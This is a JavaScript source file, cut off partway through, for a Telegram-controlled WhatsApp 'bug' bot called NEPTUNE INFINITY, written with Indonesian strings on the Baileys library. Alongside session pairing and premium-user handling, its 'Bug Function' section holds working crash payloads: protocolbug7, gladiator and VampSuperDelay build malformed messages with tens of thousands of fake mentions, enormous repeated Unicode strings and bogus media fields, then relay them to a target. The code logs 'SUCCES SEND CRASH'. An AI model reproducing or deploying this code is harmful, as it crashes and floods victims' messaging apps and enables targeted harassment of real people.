//Created By NeptunusXD
// Tele oaner: t.me/NeptunusXD
// WhatsApp owner: wa.me/6288214466258

const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync('./assets/images/thumb.jpeg');
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const ONLY_FILE = "only.json";

function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup;
}

function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}

function shouldIgnoreMessage(msg) {
  if (!isOnlyGroupEnabled()) return false;
  return msg.chat.type === "private";
}

let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./premium.json');
ensureFileExists('./admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./premium.json', (data) => (premiumUsers = data));
watchFile('./admin.json', (data) => (adminUsers = data));
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
initializeWhatsAppConnections();
  console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⠴⠶⠖⠒⠛⣿⣽⡟⠛⠓⠒⠶⠶⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠴⣯⠏
⠀⠀⢿⣯⣿⠷⣶⣤⡴⣶⣶⣤⠤⠤⣤⣄⡀⠀⣀⡤⠶⠛⠉⠀⠀⠀⠀⠀⠀⠴⠿⣼⠿⠦⠀⠀⠀⠀⠀⠀⠉⠛⠲⢦⣄⣀⣤⣴⠒⣻⣿⣿⢻⣿⣿⣿⠋⣩⣴⠋⠀
⠀⠀⠀⠙⠿⣦⣼⣟⢷⣷⢹⣿⣌⣿⡟⢺⣿⠛⠻⣄⠀⠀⠀⠀⢀⣠⣤⠤⠖⠒⠒⠛⠒⠒⠒⠦⠤⣤⣀⠀⠀⢀⣤⠖⠛⢿⣇⠐⡾⣷⣿⡟⢚⣿⣷⣿⠶⠋⠁⠀⠀
⠀⠀⠀⠀⠀⠈⠙⠛⠛⠻⠾⢿⣾⣮⣗⣸⣿⣆⠄⠀⠙⣦⡖⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢉⣷⡟⠀⡀⢨⣽⣿⣽⣶⢿⡿⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠛⠉⠙⠻⢿⣷⣶⡂⣸⡟⠓⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠛⣧⣄⣿⣾⣿⡋⠉⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠁⠀⠀⠀⣠⠾⣿⣿⣿⣿⡁⠀⠈⢳⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠋⠀⠀⣿⣿⣿⣫⣶⠟⢦⡀⠀⠀⣀⠹⣆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡼⢿⡷⣾⠀⢀⡞⠁⠀⠹⡄⢻⣿⣿⡆⠀⠘⣿⣦⣤⣀⣀⠀⠀⣀⣀⣤⣶⣿⡯⠀⢀⣾⣿⡿⠋⢀⡞⠀⠀⠙⢆⣀⣿⣻⣯⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⡾⠷⠛⢳⡞⣻⠋⠀⠀⠀⠀⢳⡀⢻⣿⣿⣦⣠⣿⡯⣷⡉⣽⠿⠿⠟⠉⣹⡯⣿⣷⣤⣾⣿⣿⠁⠀⣼⠃⠀⠀⠀⠈⠻⡍⠏⠁⠉⢷⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠈⡱⠁⠀⠀⠀⠀⠀⠈⢷⠈⣿⣿⣿⠟⣿⣇⡝⣮⡈⠀⠀⠀⣴⡟⠀⢿⡟⢿⣻⣿⣇⠀⣰⠇⠀⠀⠀⠀⠀⠀⠙⡄⠀⠀⠀⢿⡀⠀⠀⠀
⠀⠀⠀⠀⠀⣼⠇⠀⠀⠀⡼⠃⠀⠀⠀⣀⣀⣠⣤⣼⠿⣿⢿⠃⣰⠋⠈⠁⢻⡙⢶⣴⠟⣹⠃⠀⠀⠱⡄⢹⣿⣟⠲⢿⠤⠤⣤⣤⣀⡀⠀⠀⠸⡆⠀⠀⠈⣧⠀⠀⠀
⠀⠀⠀⠀⢠⡏⠀⠀⠀⣰⣃⣤⠖⠋⣉⡡⢆⣠⠟⠁⣼⣿⡿⢸⣇⠶⠊⠀⢸⣷⠛⠉⢳⣿⠀⠀⠐⢶⠹⡌⣿⡿⣆⠈⠱⢦⡐⠦⣄⣉⣙⣶⣄⣹⡀⠀⠀⢸⡇⠀⠀
⠀⠀⠀⠀⣾⠀⠀⢰⣶⣿⣿⣿⡿⢿⣥⣶⣟⣁⣠⣞⣽⠟⡇⢸⣿⡀⣀⡴⠋⢹⡄⠀⣸⣉⣻⣦⣄⣸⣰⡇⣿⢹⣮⣷⣤⣤⣿⠿⠞⣛⣿⣿⣿⣿⡿⠂⠀⠀⢿⠀⠀
⠀⠀⠀⠀⡟⠀⠀⠀⢹⠋⠳⢿⣿⣷⡶⠦⢭⣽⣾⣿⡟⠰⢷⣘⣿⠁⠿⠋⠉⠙⣿⠉⡿⠉⠉⠉⠏⢩⣿⢠⣟⣐⣿⣿⢷⣾⣷⣒⣩⣿⠿⠟⠉⠀⢱⠀⠀⠀⢸⠀⠀
⠀⠀⠀⢠⡇⠀⠀⠀⢸⠀⠀⠀⠈⠙⠻⠿⢿⣿⣿⣿⡟⣠⣾⣳⣽⣷⣦⢠⠄⣖⢹⣿⠃⠃⠠⠂⣰⣿⣿⢿⣧⣄⣻⣿⣿⣛⠟⠛⠋⠀⠀⠀⠀⠀⢸⡄⠀⠀⢸⡇⠀
⠀⠀⠀⢸⡇⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⢀⣸⠿⠋⢻⣿⣿⣿⣿⡽⣽⣾⣿⣦⣬⠞⠏⠀⢤⣼⣿⣿⣿⢱⣿⣿⣿⣿⡆⠈⠙⠲⣤⡀⠀⠀⠀⠀⠀⢸⡇⠀⠀⢸⡇⠀
⠀⠀⠀⠀⡇⢰⣄⣤⣾⠀⠀⠀⢀⣠⠶⠋⠁⠀⢀⣾⣿⢿⣿⣾⣇⢹⡏⣻⣿⠞⠀⠀⠀⠰⣿⣏⣸⡇⣾⣿⣿⣿⣿⣿⠀⠀⠀⠀⠙⠳⢦⣀⠀⠀⢸⢳⣦⡞⢸⡇⠀
⠀⠀⠀⠀⣷⡼⣯⡽⢿⣆⣤⣞⣋⣀⣀⣀⣀⣀⣸⣿⣿⣧⠬⠹⣯⣬⣿⠉⠹⣄⠀⠀⠀⣰⠏⠉⣿⢤⣿⠟⠲⣾⣿⣻⣧⣤⣤⣤⡤⠤⠤⠽⠿⢦⡼⠛⣷⠛⢿⠀⠀
⠀⠀⠀⠀⢻⡄⠘⠃⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣷⣄⠀⢻⣿⠏⢦⠀⠈⠐⠀⠸⡁⠀⡟⠙⣿⠟⠀⣠⣾⣿⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⠙⢀⡿⠀⠀
⠀⠀⠀⠀⠘⣇⠀⠀⠀⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣷⣄⠿⣄⠈⢿⡆⠀⠀⠀⢴⡿⠀⣠⠟⣠⣾⣿⢿⡽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⣸⠇⠀⠀
⠀⠀⠀⠀⠀⢹⡆⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⢿⣶⡈⢦⢸⡇⠀⢠⠀⢸⡇⠐⢁⣼⣿⢿⣯⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠁⠀⠀⢠⡏⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢶⣿⣿⣳⠀⠀⡇⠀⣼⠀⢸⡇⠀⣜⣿⣹⠶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠁⠀⠀⢀⡿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠈⢣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣯⡃⢸⡇⠀⢹⠂⠈⡇⠀⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⠀⠀⠀⢠⡞⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣽⠷⣼⠃⠀⠀⠀⠀⢷⡰⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠔⠁⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣄⠀⠀⠀⠀⠙⢦⣀⠀⠀⠀⠀⠀⠀⠀⢿⣴⣿⣦⣀⣠⣀⣤⣿⣧⢾⠆⠀⠀⠀⠀⠀⠀⠀⣠⠶⠃⠀⠀⠀⢀⡼⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀⣆⣉⣷⢦⣀⠀⠀⠀⠀⢸⡜⠿⣷⣿⣿⠿⣽⡿⠛⡞⠀⠀⠀⠀⢀⣠⣴⢊⣁⠀⠀⠀⢀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⣄⣠⢿⣩⡷⡄⠈⠙⠓⠤⢤⣀⣙⣦⣈⣻⣦⣾⣁⣠⣞⣁⣀⠤⠴⠚⠋⣀⣿⣻⣧⡀⣀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠦⣟⡀⠀⠀⠀⠀⠀⠀⠀⠉⠉⢿⡿⠷⣿⢿⡯⠉⠉⠀⠀⠀⠀⠀⠉⠉⣿⡾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠶⣄⣀⡀⠀⠀⠀⠀⠀⠙⣶⡿⢸⠇⠀⠀⠀⠀⣀⣠⠴⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠒⠒⠲⢾⣟⡥⠿⠒⠒⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));

console.log(chalk.bold.blue(`
( ☠️) - 𝐍𝐄𝐏𝐓𝐔𝐍𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 V1.0
═════════════════════════
`));
};

startBot();




let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`◇ 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 ${botNumber}..... 𝙨𝙪𝙘𝙘𝙚𝙨\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`◇ 𝙎𝙪𝙘𝙘𝙚𝙨 𝙥𝙧𝙤𝙨𝙚𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜\`\`\`
𝙔𝙤𝙪𝙧 𝙘𝙤𝙙𝙚 : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

const GetXiau = JSON.stringify({
    status: true,
        criador: "GetSuzoXopown",
          resultado: {
    type: "md",
    ws: {
    _events: { "CB:ib,,dirty": ["Array"] },
    _eventsCount: 800000,
    _maxListeners: 0,
    url: "wss://web.whatsapp.com/ws/chat",
                                  config: {
                      version: ["Array"],
                      browser: ["Array"],
                      waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                      sockCectTimeoutMs: 20000,
                      keepAliveIntervalMs: 30000,
                      logger: {},
                      printQRInTerminal: false,
                      emitOwnEvents: true,
                      defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                       linkPreviewImageThumbnailWidth: 192,
                       transactionOpts: { Object: "transactionOptsData" },
                       generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
                }
               }
             }
          });
          


// -------( Fungsional Function Before Parameters )--------- \\
//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomImage() {
  const images = [
        "https://qu.ax/bFgFd.jpg",
        "https://qu.ax/TgfrM.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldowwn
let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

async function getWhatsAppChannelInfo(link) {
    if (!link.includes("https://whatsapp.com/channel/")) return { error: "Link tidak valid!" };
    
    let channelId = link.split("https://whatsapp.com/channel/")[1];
    try {
        let res = await sock.newsletterMetadata("invite", channelId);
        return {
            id: res.id,
            name: res.name,
            subscribers: res.subscribers,
            status: res.state,
            verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"
        };
    } catch (err) {
        return { error: "Gagal mengambil data! Pastikan channel valid." };
    }
}





// ---------( The Bug Function)---------- \\

async function protocolbug7(target, mention) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messageContent, { userJid: target });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await sock.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await sock.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}
async function gladiator(target, mention = true) {
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "𝐕͢𝐢͡𝐧͜𝐜͢𝐞͡𝐧͜𝐭 ⍣᳟ 𝐆͜𝐞͢𝐭𝐒͡𝐮𝐙𝐨༑⃟⃟🎭",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "𝐕͢𝐢͡𝐧͜𝐜͢𝐞͡𝐧͜𝐭 ⍣᳟ 𝐆͜𝐞͢𝐭𝐒͡𝐮𝐙𝐨༑⃟⃟🎭"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Xiee-leee🕸️" },
                        content: undefined
                    }
                ]
            }
        );
    }
    console.log(chalk.bold.red('SUCCES SEND CRASH'));
}
async function VampSuperDelay(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "Vampire Crash" + "ោ៝".repeat(10000),
        title: "Iqbhalkeifer",
